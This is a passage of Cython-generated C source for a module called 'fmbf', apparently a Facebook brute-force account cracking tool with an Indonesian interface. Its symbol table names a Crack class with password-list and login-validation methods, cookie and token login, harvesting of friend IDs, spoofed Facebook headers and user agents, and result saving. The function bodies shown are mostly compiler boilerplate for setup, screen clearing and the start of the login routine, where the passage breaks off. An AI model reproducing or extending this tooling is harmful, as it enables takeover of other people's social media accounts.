static PyObject *__pyx_n_s_key;
static PyObject *__pyx_kp_u_like_Mac_OS_X_AppleWebKit;
static PyObject *__pyx_n_s_listdir;
static PyObject *__pyx_n_s_locale;
static PyObject *__pyx_n_s_login;
static PyObject *__pyx_kp_u_login_device_based_validate_pas;
static PyObject *__pyx_kp_u_login_next_ref_dbl_fl_login_fro;
static PyObject *__pyx_n_s_login_no_pin;
static PyObject *__pyx_kp_u_login_save_device_login_source;
static PyObject *__pyx_n_s_logo;
static PyObject *__pyx_kp_u_logout_hapus_login;
static PyObject *__pyx_n_s_loop;
static PyObject *__pyx_n_s_lower;
static PyObject *__pyx_n_s_lsd;
static PyObject *__pyx_kp_s_m_facebook_com;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_kp_s_masukan_cookie;
static PyObject *__pyx_kp_s_masukan_id_atau_username;
static PyObject *__pyx_kp_s_masukan_nama_file;
static PyObject *__pyx_kp_s_masukan_useragent;
static PyObject *__pyx_kp_s_max_age_0;
static PyObject *__pyx_n_s_max_workers;
static PyObject *__pyx_n_s_mbasic;
static PyObject *__pyx_kp_s_mbasic_facebook_com;
static PyObject *__pyx_n_s_memek;
static PyObject *__pyx_n_s_menu;
static PyObject *__pyx_n_s_message;
static PyObject *__pyx_n_s_metaclass;
static PyObject *__pyx_kp_s_method;
static PyObject *__pyx_n_s_method_2;
static PyObject *__pyx_n_s_metode_api;
static PyObject *__pyx_n_s_metode_validate;
static PyObject *__pyx_n_s_mob;
static PyObject *__pyx_n_s_mobile;
static PyObject *__pyx_n_s_model_device;
static PyObject *__pyx_n_s_module;
static PyObject *__pyx_n_s_mtd;
static PyObject *__pyx_n_s_myua;
static PyObject *__pyx_n_s_nama;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_kp_u_name_friends_fields_id_name_birt;
static PyObject *__pyx_kp_u_name_friends_fields_id_name_birt_2;
static PyObject *__pyx_kp_s_name_jazoest_value;
static PyObject *__pyx_kp_s_name_lsd_value;
static PyObject *__pyx_kp_u_nav_source_no_referrer;
static PyObject *__pyx_n_s_next;
static PyObject *__pyx_n_s_now;
static PyObject *__pyx_n_s_num;
static PyObject *__pyx_n_s_ok;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_origin;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_paging;
static PyObject *__pyx_n_s_params;
static PyObject *__pyx_n_s_parser;
static PyObject *__pyx_n_s_pass;
static PyObject *__pyx_n_s_password;
static PyObject *__pyx_kp_s_pilih_menu;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_prepare;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_prox;
static PyObject *__pyx_n_s_publik;
static PyObject *__pyx_n_s_pw;
static PyObject *__pyx_n_s_pwx;
static PyObject *__pyx_n_s_qualname;
static PyObject *__pyx_n_s_query;
static PyObject *__pyx_n_s_r;
static PyObject *__pyx_n_s_randint;
static PyObject *__pyx_n_s_random;
static PyObject *__pyx_n_s_randrange;
static PyObject *__pyx_n_s_range;
static PyObject *__pyx_n_s_re;
static PyObject *__pyx_n_s_read;
static PyObject *__pyx_n_s_referer;
static PyObject *__pyx_n_s_regex;
static PyObject *__pyx_n_s_remove;
static PyObject *__pyx_n_s_replace;
static PyObject *__pyx_n_s_requests;
static PyObject *__pyx_n_s_requests_exceptions;
static PyObject *__pyx_n_s_res;
static PyObject *__pyx_kp_s_s_s;
static PyObject *__pyx_kp_s_same_origin;
static PyObject *__pyx_n_s_sandi;
static PyObject *__pyx_kp_s_sandi_tambahan;
static PyObject *__pyx_n_s_sdk;
static PyObject *__pyx_n_s_sdk_version;
static PyObject *__pyx_n_s_search;
static PyObject *__pyx_kp_s_sec_ch_ua;
static PyObject *__pyx_kp_s_sec_ch_ua_mobile;
static PyObject *__pyx_kp_s_sec_ch_ua_platform;
static PyObject *__pyx_kp_s_sec_fetch_dest;
static PyObject *__pyx_kp_s_sec_fetch_mode;
static PyObject *__pyx_kp_s_sec_fetch_site;
static PyObject *__pyx_kp_s_sec_fetch_user;
static PyObject *__pyx_kp_u_sedang_mengumpulkan;
static PyObject *__pyx_kp_u_selamat_datang;
static PyObject *__pyx_n_s_self;
static PyObject *__pyx_n_s_send;
static PyObject *__pyx_n_s_ses;
static PyObject *__pyx_n_s_session_cookies;
static PyObject *__pyx_n_s_session_key;
static PyObject *__pyx_n_s_set_ugent;
static PyObject *__pyx_n_s_shell;
static PyObject *__pyx_n_s_sig;
static PyObject *__pyx_n_s_simpan_hasil;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_splitlines;
static PyObject *__pyx_n_s_stdout;
static PyObject *__pyx_n_s_strftime;
static PyObject *__pyx_n_s_sub;
static PyObject *__pyx_n_s_submit;
static PyObject *__pyx_n_s_subprocess;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_tampung;
static PyObject *__pyx_kp_u_tanggal;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_kp_s_text_html_application_xhtml_xml;
static PyObject *__pyx_n_s_throw;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_kp_u_token;
static PyObject *__pyx_n_s_token_2;
static PyObject *__pyx_kp_s_token_txt;
static PyObject *__pyx_kp_u_total;
static PyObject *__pyx_kp_u_total_id;
static PyObject *__pyx_kp_s_txt;
static PyObject *__pyx_n_s_ua;
static PyObject *__pyx_n_s_ugen2;
static PyObject *__pyx_n_s_ugent;
static PyObject *__pyx_n_s_uid;
static PyObject *__pyx_n_s_update;
static PyObject *__pyx_kp_s_upgrade_insecure_requests;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_n_s_urutan;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_kp_s_user_agent;
static PyObject *__pyx_kp_u_useragent_dan_di_simpan_ke;
static PyObject *__pyx_n_s_usragent;
static PyObject *__pyx_kp_s_utf_8;
static PyObject *__pyx_n_s_value;
static PyObject *__pyx_n_s_verchrome;
static PyObject *__pyx_n_s_versi;
static PyObject *__pyx_n_s_versi_android;
static PyObject *__pyx_n_s_versi_chrome;
static PyObject *__pyx_n_s_versi_iphone;
static PyObject *__pyx_n_s_w;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_n_s_x;
static PyObject *__pyx_kp_s_x_fb_connection_bandwidth;
static PyObject *__pyx_kp_s_x_fb_connection_quality;
static PyObject *__pyx_kp_s_x_fb_http_engine;
static PyObject *__pyx_kp_s_x_fb_lsd;
static PyObject *__pyx_kp_s_x_fb_net_hni;
static PyObject *__pyx_kp_s_x_fb_sim_hni;
static PyObject *__pyx_kp_s_x_requested_with;
static PyObject *__pyx_n_s_xx;
static PyObject *__pyx_n_s_y;
static PyObject *__pyx_n_s_z;
static PyObject *__pyx_pf_4fmbf_4Main___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_4Main_2logo(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_4Main_4login(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_4Main_6menu(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_4Main_8publik(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_user, PyObject *__pyx_v_fields, PyObject *__pyx_v_token, PyObject *__pyx_v_cookie); 
static PyObject *__pyx_pf_4fmbf_4Main_10set_ugent(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_4Main_12cek_result(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_5Crack___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_5Crack_2atursandi(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyObject *__pyx_pf_4fmbf_5Crack_4sandi(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_pw); 
static PyObject *__pyx_pf_4fmbf_5Crack_10metode_api_genexpr(PyObject *__pyx_self); 
static PyObject *__pyx_pf_4fmbf_5Crack_6metode_api(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_user, PyObject *__pyx_v_pwx); 
static PyObject *__pyx_pf_4fmbf_5Crack_8metode_validate(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_user, PyObject *__pyx_v_pwx, PyObject *__pyx_v_url); 
static PyObject *__pyx_pf_4fmbf_5Crack_10simpan_hasil(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyObject *__pyx_tp_new_4fmbf___pyx_scope_struct__metode_api(PyTypeObject *t, PyObject *a, PyObject *k); 
static PyObject *__pyx_tp_new_4fmbf___pyx_scope_struct_1_genexpr(PyTypeObject *t, PyObject *a, PyObject *k); 
static __Pyx_CachedCFunction __pyx_umethod_PyDict_Type_get = {0, &__pyx_n_s_get, 0, 0, 0};
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_3;
static PyObject *__pyx_int_4;
static PyObject *__pyx_int_8;
static PyObject *__pyx_int_10;
static PyObject *__pyx_int_12;
static PyObject *__pyx_int_15;
static PyObject *__pyx_int_26;
static PyObject *__pyx_int_30;
static PyObject *__pyx_int_32;
static PyObject *__pyx_int_40;
static PyObject *__pyx_int_70;
static PyObject *__pyx_int_90;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_108;
static PyObject *__pyx_int_110;
static PyObject *__pyx_int_150;
static PyObject *__pyx_int_300;
static PyObject *__pyx_int_325;
static PyObject *__pyx_int_4000;
static PyObject *__pyx_int_4900;
static PyObject *__pyx_int_20000;
static PyObject *__pyx_int_40000;
static PyObject *__pyx_int_20000000;
static PyObject *__pyx_int_30000000;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__5;
static PyObject *__pyx_tuple__6;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__8;
static PyObject *__pyx_tuple__9;
static PyObject *__pyx_tuple__10;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__12;
static PyObject *__pyx_tuple__14;
static PyObject *__pyx_tuple__15;
static PyObject *__pyx_tuple__16;
static PyObject *__pyx_tuple__18;
static PyObject *__pyx_tuple__19;
static PyObject *__pyx_tuple__20;
static PyObject *__pyx_tuple__22;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__27;
static PyObject *__pyx_tuple__28;
static PyObject *__pyx_tuple__29;
static PyObject *__pyx_tuple__30;
static PyObject *__pyx_tuple__31;
static PyObject *__pyx_tuple__33;
static PyObject *__pyx_tuple__34;
static PyObject *__pyx_tuple__35;
static PyObject *__pyx_tuple__37;
static PyObject *__pyx_tuple__38;
static PyObject *__pyx_tuple__40;
static PyObject *__pyx_tuple__41;
static PyObject *__pyx_tuple__43;
static PyObject *__pyx_tuple__44;
static PyObject *__pyx_tuple__45;
static PyObject *__pyx_tuple__47;
static PyObject *__pyx_tuple__49;
static PyObject *__pyx_tuple__50;
static PyObject *__pyx_tuple__51;
static PyObject *__pyx_tuple__52;
static PyObject *__pyx_tuple__53;
static PyObject *__pyx_tuple__54;
static PyObject *__pyx_tuple__55;
static PyObject *__pyx_tuple__56;
static PyObject *__pyx_tuple__57;
static PyObject *__pyx_tuple__59;
static PyObject *__pyx_tuple__60;
static PyObject *__pyx_tuple__63;
static PyObject *__pyx_tuple__64;
static PyObject *__pyx_tuple__65;
static PyObject *__pyx_tuple__66;
static PyObject *__pyx_tuple__67;
static PyObject *__pyx_tuple__76;
static PyObject *__pyx_tuple__77;
static PyObject *__pyx_tuple__78;
static PyObject *__pyx_tuple__79;
static PyObject *__pyx_tuple__80;
static PyObject *__pyx_tuple__81;
static PyObject *__pyx_tuple__82;
static PyObject *__pyx_tuple__83;
static PyObject *__pyx_tuple__85;
static PyObject *__pyx_tuple__87;
static PyObject *__pyx_tuple__89;
static PyObject *__pyx_tuple__91;
static PyObject *__pyx_tuple__93;
static PyObject *__pyx_tuple__95;
static PyObject *__pyx_tuple__97;
static PyObject *__pyx_tuple__99;
static PyObject *__pyx_tuple__101;
static PyObject *__pyx_tuple__103;
static PyObject *__pyx_tuple__105;
static PyObject *__pyx_tuple__107;
static PyObject *__pyx_codeobj__84;
static PyObject *__pyx_codeobj__86;
static PyObject *__pyx_codeobj__88;
static PyObject *__pyx_codeobj__90;
static PyObject *__pyx_codeobj__92;
static PyObject *__pyx_codeobj__94;
static PyObject *__pyx_codeobj__96;
static PyObject *__pyx_codeobj__98;
static PyObject *__pyx_codeobj__100;
static PyObject *__pyx_codeobj__102;
static PyObject *__pyx_codeobj__104;
static PyObject *__pyx_codeobj__106;
static PyObject *__pyx_codeobj__108;





static PyObject *__pyx_pw_4fmbf_4Main_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_4Main_1__init__ = {"__init__", (PyCFunction)__pyx_pw_4fmbf_4Main_1__init__, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_4Main_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__init__ (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_4Main___init__(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_4Main___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__init__", 0);

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_memek, __pyx_t_1) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_ses); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_kp_s_http_ip_api_com_json) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_s_http_ip_api_com_json);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_json); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_1, __pyx_n_s_query); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_ip, __pyx_t_4) < 0) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_now); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_strftime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_kp_s_d_B_Y) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_d_B_Y);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_hari_ini, __pyx_t_4) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("fmbf.Main.__init__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_4Main_3logo(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_4Main_3logo = {"logo", (PyCFunction)__pyx_pw_4fmbf_4Main_3logo, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_4Main_3logo(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("logo (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_4Main_2logo(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_4Main_2logo(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("logo", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_s_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_N); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_t_3, __pyx_kp_u_); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 47, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("fmbf.Main.logo", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_4Main_5login(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_4Main_5login = {"login", (PyCFunction)__pyx_pw_4fmbf_4Main_5login, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_4Main_5login(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("login (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_4Main_4login(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_4Main_4login(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_v_url = NULL;
  PyObject *__pyx_v_regex = NULL;
  PyObject *__pyx_v_get = NULL;
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  Py_ssize_t __pyx_t_4;
  Py_UCS4 __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("login", 0);

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_logo); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = 0;
  __pyx_t_5 = 127;
  __Pyx_INCREF(__pyx_kp_u__2);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__2);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__2);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_N); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
